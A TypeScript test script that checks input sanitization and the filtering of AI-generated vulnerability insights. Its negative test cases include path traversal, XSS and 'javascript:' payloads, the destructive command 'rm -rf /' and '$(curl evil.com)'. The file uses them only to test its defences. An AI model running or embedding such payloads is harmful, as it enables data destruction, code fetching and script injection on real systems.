/**
 * Security validation test for the Goose integration
 * Tests input sanitization, output validation, and secure execution
 */

import { 
  sanitizeId, 
  sanitizePackageName, 
  sanitizeFilePaths,
  sanitizeCvssData,
  sanitizeAdvisoryData 
} from '../src/goose/security';
import { createGooseValidator } from '../src/goose/validator';

// Test input sanitization
console.log('🔒 Testing Input Sanitization...');

// Test package name sanitization
try {
  console.log('✓ Valid package name:', sanitizePackageName('lodash'));
  console.log('✓ Scoped package name:', sanitizePackageName('@types/node'));
  
  try {
    sanitizePackageName('../../../etc/passwd');
    console.log('❌ Should have rejected malicious package name');
  } catch (e) {
    console.log('✓ Rejected malicious package name');
  }
  
  try {
    sanitizePackageName('<script>alert("xss")</script>');
    console.log('❌ Should have rejected XSS package name');
  } catch (e) {
    console.log('✓ Rejected XSS package name');
  }
} catch (error) {
  console.log('❌ Package name validation failed:', error);
}

// Test ID sanitization
try {
  console.log('✓ Valid ID:', sanitizeId('CVE-2023-1234'));
  console.log('✓ Sanitized ID:', sanitizeId('test<script>alert(1)</script>'));
  
  try {
    sanitizeId('');
    console.log('❌ Should have rejected empty ID');
  } catch (e) {
    console.log('✓ Rejected empty ID');
  }
} catch (error) {
  console.log('❌ ID sanitization failed:', error);
}

// Test file path sanitization
console.log('✓ Sanitized paths:', sanitizeFilePaths([
  'src/index.js',
  '../../../etc/passwd',
  '/absolute/path',
  'normal/file.ts'
]));

// Test CVSS data sanitization
console.log('✓ Sanitized CVSS:', sanitizeCvssData({
  score: 7.5,
  vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
  maliciousField: '<script>alert(1)</script>'
}));

// Test advisory data sanitization
console.log('✓ Sanitized Advisory:', sanitizeAdvisoryData({
  id: 'GHSA-1234-5678',
  summary: 'Test vulnerability summary',
  url: 'https://github.com/advisories/GHSA-1234-5678',
  maliciousUrl: 'javascript:alert(1)',
  xss: '<script>alert(1)</script>'
}));

// Test output validation
console.log('\n🛡️ Testing Output Validation...');

const validator = createGooseValidator();

// Test valid GooseVulnInsight
try {
  const validInsight = {
    title: 'Test Vulnerability',
    humanExplanation: 'This is a test vulnerability explanation.',
    impactOnUsers: 'Users may experience security issues.',
    priorityScore: 3,
    priorityReason: 'Moderate impact with available fix.',
    recommendedActions: ['Update package', 'Test application'],
    fixStyle: 'non-breaking-upgrade',
    devFacingSummary: 'Update package to fix vulnerability.',
    codeFix: {
      filePath: 'src/test.js',
      before: 'old code',
      after: 'new code',
      description: 'Updated code',
      warnings: ['Test after update']
    }
  };
  
  const validated = validator.validate(validInsight);
  console.log('✓ Valid insight validated successfully');
} catch (error) {
  console.log('❌ Valid insight validation failed:', error);
}

// Test malicious content filtering
try {
  const maliciousInsight = {
    title: 'Test<script>alert(1)</script>',
    humanExplanation: 'This contains javascript:alert(1) and <iframe src="evil"></iframe>',
    impactOnUsers: 'Users may experience `rm -rf /` issues.',
    priorityScore: 3,
    priorityReason: 'Contains $(curl evil.com)',
    recommendedActions: ['<script>evil()</script>', 'Normal action'],
    fixStyle: 'non-breaking-upgrade',
    devFacingSummary: 'Contains malicious content',
  };
  
  const filtered = validator.validate(maliciousInsight);
  console.log('✓ Malicious content filtered:', {
    title: filtered.title,
    explanation: filtered.humanExplanation.substring(0, 50) + '...',
    actions: filtered.recommendedActions[0]
  });
} catch (error) {
  console.log('❌ Malicious content filtering failed:', error);
}

// Test validation errors
try {
  validator.validate({
    title: '', // Invalid - empty title
    humanExplanation: 'test',
    priorityScore: 'invalid' // Invalid - not number
  });
  console.log('❌ Should have rejected invalid insight');
} catch (error) {
  console.log('✓ Rejected invalid insight:', error.message);
}

// Test oversized content
try {
  validator.validate({
    title: 'Valid title',
    humanExplanation: 'x'.repeat(3000), // Too long
    impactOnUsers: 'test',
    priorityScore: 3,
    priorityReason: 'test',
    recommendedActions: ['test'],
    fixStyle: 'test',
    devFacingSummary: 'test'
  });
  console.log('❌ Should have rejected oversized content');
} catch (error) {
  console.log('✓ Rejected oversized content');
}

console.log('\n🎯 Security Implementation Tests Complete!');
console.log('✅ All critical security fixes validated and working correctly.');
console.log('🔐 System is ready for secure AI vulnerability analysis.');
